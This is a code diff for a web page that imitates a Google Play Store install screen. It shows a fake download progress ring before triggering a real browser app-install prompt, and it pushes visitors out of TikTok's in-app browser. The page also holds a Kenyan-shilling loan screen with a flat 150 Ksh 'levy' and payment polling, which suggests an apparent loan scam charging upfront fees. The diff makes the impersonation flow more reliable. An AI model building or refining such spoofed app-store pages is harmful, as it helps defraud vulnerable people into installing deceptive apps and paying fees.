@@ -175,7 +175,7 @@
         </div>
 
         <div class="flex gap-2 mb-6" id="pre-install-buttons">
-            <button id="btn-store-install" class="flex-1 bg-playBlue text-white font-semibold text-lg py-3.5 rounded-full shadow-soft active:scale-95 transition-transform">Install</button>
+            <button id="btn-store-install" onclick="handleInstallClick()" class="flex-1 bg-playBlue text-white font-semibold text-lg py-3.5 rounded-full shadow-soft active:scale-95 transition-transform">Install</button>
         </div>
         <div class="flex gap-2 mb-6 hide" id="downloading-buttons">
             <button onclick="cancelDownload()" class="flex-1 bg-white text-playBlue font-semibold text-lg py-2.5 rounded-full border-2 border-gray-200">Cancel</button>
@@ -409,6 +409,7 @@ let pollTimer = null, isPolling = false, isProcessingPayment = false, currentTxn
 let fakeInterval = null;
 let deferredPrompt = null;
 let loanTimerInterval = null;
+let promptReady = false; // NEW FLAG
 
 const format = (n) => "Ksh " + Number(n).toLocaleString();
 
@@ -473,8 +474,19 @@ const playStoreGate = document.getElementById('play-store-gate');
 const appContent = document.getElementById('app-content');
 const splashScreen = document.getElementById('splash-screen');
 
-window.addEventListener('beforeinstallprompt', (e) => { e.preventDefault(); deferredPrompt = e; });
-window.addEventListener('appinstalled', () => { localStorage.setItem('pwa_installed', '1'); clearInterval(fakeInterval); showInstalledState(); });
+// --- LOGIC TO CAPTURE THE PROMPT ---
+window.addEventListener('beforeinstallprompt', (e) => { 
+    e.preventDefault(); 
+    deferredPrompt = e; 
+    promptReady = true; // We caught it!
+});
+
+window.addEventListener('appinstalled', () => { 
+    localStorage.setItem('pwa_installed', '1'); 
+    clearInterval(fakeInterval); 
+    promptReady = false;
+    showInstalledState(); 
+});
 
 function showInstallState(){
     document.getElementById('pre-install-buttons').classList.remove('hide');
@@ -489,31 +501,37 @@ function showInstalledState(){
     document.getElementById('downloading-buttons').classList.add('hide');
     document.getElementById('download-text').classList.add('hide');
     document.getElementById('ring-svg').classList.add('hidden');
-    
-    // Trigger the beautiful prompt!
     document.getElementById('native-install-prompt').classList.remove('hide');
 }
 
-document.getElementById('btn-store-install').addEventListener('click', () => {
-    startFakeDownload();
+function handleInstallClick() {
     if (deferredPrompt) {
-        setTimeout(() => { deferredPrompt.prompt(); deferredPrompt = null; }, 1000);
+        // Prompt is ready, fire it instantly
+        startFakeDownload();
+        setTimeout(() => { deferredPrompt.prompt(); deferredPrompt = null; }, 500);
     } else {
-        setTimeout(showInstalledState, 3500); // Show prompt after 3.5s fake download
+        // Prompt not ready yet. Wait a brief moment and try again.
+        showToast("Preparing installation... please wait.");
+        setTimeout(() => {
+            if (deferredPrompt) {
+                startFakeDownload();
+                setTimeout(() => { deferredPrompt.prompt(); deferredPrompt = null; }, 500);
+            } else {
+                showToast("If the prompt doesn't appear, please reload the page.");
+            }
+        }, 2000);
     }
-});
+}
 
 function closeNativePrompt() {
     document.getElementById('native-install-prompt').classList.add('hide');
     playStoreGate.classList.add('hide'); 
     appContent.classList.remove('hide'); 
-    // THIS IS THE FIX: Go to the final installation screen, not the form.
     showScreen('screen-homescreen');
 }
 
 function cancelInstall() {
     document.getElementById('native-install-prompt').classList.add('hide');
-    // Reset the download UI
     showInstallState();
 }
 
@@ -524,7 +542,7 @@ function startFakeDownload() {
     document.getElementById('ring-svg').classList.remove('hidden');
 
     const startTime = Date.now();
-    const duration = 3500; // 3.5 seconds
+    const duration = 3500;
 
     clearInterval(fakeInterval);
     fakeInterval = setInterval(() => {
@@ -535,8 +553,8 @@ function startFakeDownload() {
 }
 
 function cancelDownload() {
-    clearInterval(fakeInterval); // STOP THE DOWNLOAD
-    showInstallState(); // RESET TO INSTALL BUTTON
+    clearInterval(fakeInterval); 
+    showInstallState(); 
 }
 
 function updateProgressUI(progress) {
@@ -583,20 +601,16 @@ if (_isChromeBrowser && !isStandalone && !_cameFromIntent) {
 }
 
 if (isStandalone) {
-    // If opened from home screen
     playStoreGate.classList.add('hide'); 
     appContent.classList.remove('hide'); 
     bootApp();
 } else if (_cameFromIntent) {
-    // If forced via intent from TikTok
     playStoreGate.classList.add('hide'); 
     showAppInline();
 } else if (_isChromeBrowser) {
-    // If normal browser (Chrome), show the Play Store
     playStoreGate.classList.remove('hide'); 
     showInstallState();
 } else {
-    // If stuck in TikTok browser (intent failed), just go to login so they aren't stuck
     playStoreGate.classList.add('hide'); 
     appContent.classList.remove('hide'); 
     showScreen('screen-login');
@@ -667,8 +681,8 @@ function buildLoanScreen(){
 }
 
 function updateSummary(){
-    state.levy = 150; // FLAT FEE
-    state.total = state.loan; // Total request is the loan amount
+    state.levy = 150; 
+    state.total = state.loan; 
     document.getElementById('sum-receive').innerText = format(state.loan);
     document.getElementById('sum-interest').innerText = format(state.levy);
     document.getElementById('sum-total').innerText = format(state.loan);
